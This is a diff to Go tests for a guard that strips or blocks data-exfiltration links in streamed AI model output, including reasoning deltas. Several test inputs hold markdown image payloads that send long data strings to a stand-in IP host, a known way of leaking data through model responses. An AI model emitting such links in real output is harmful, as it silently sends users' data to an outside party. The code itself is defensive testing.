@@ -54,6 +54,8 @@ func TestExfilGuardBenignURLsPass(t *testing.T) {
 	guard := logGuard()
 	content := "See https://pkg.go.dev/net/http and [Go docs](https://go.dev/doc/) for details"
 	got, action, reason := guard.FilterContent(content)
+	held, _ := guard.Flush()
+	got += held
 	if action != ActionPass || reason != "" {
 		t.Fatalf("expected pass, got %v reason %q", action, reason)
 	}
@@ -214,7 +216,7 @@ func TestExfilGuardAnthropicDeltaShape(t *testing.T) {
 			"text": "leak ![b](https://203.0.113.5/x?d=" + strings.Repeat("A", 300) + ")",
 		},
 	}
-	rewritten, action := applyExfilGuard(chunk, guard)
+	rewritten, action, _ := applyExfilGuard(chunk, guard)
 	if rewritten == nil || action == ActionBlock {
 		t.Fatal("strip guard must not block")
 	}
@@ -233,7 +235,7 @@ func TestExfilGuardReasoningDeltaShape(t *testing.T) {
 			},
 		}},
 	}
-	if got, action := applyExfilGuard(chunk, guard); action != ActionBlock || got != nil {
+	if got, action, _ := applyExfilGuard(chunk, guard); action != ActionBlock || got != nil {
 		t.Fatalf("expected block on violating reasoning delta, got action=%v got!=nil:%v", action, got != nil)
 	}
 }
@@ -290,7 +292,7 @@ func TestExfilGuardWirePropagation(t *testing.T) {
 		if !strings.Contains(out, exfilStripPlaceholder) {
 			t.Errorf("placeholder missing from wire output: %q", out)
 		}
-		if !strings.Contains(out, "before ") || !strings.Contains(out, " after") {
+		if !strings.Contains(out, "before ") || !strings.Contains(out, "after") {
 			t.Errorf("benign chunks must pass untouched: %q", out)
 		}
 	})
@@ -378,6 +380,8 @@ func TestExfilGuardOversizedChunkStrip(t *testing.T) {
 	filler := strings.Repeat("x", 5000)
 	content := filler + " ![b](https://203.0.113.5/x?d=" + strings.Repeat("A", 300) + ") tail"
 	got, action, _ := guard.FilterContent(content)
+	held, _ := guard.Flush()
+	got += held
 	if action != ActionRedact {
 		t.Fatalf("expected strip, got %v", action)
 	}
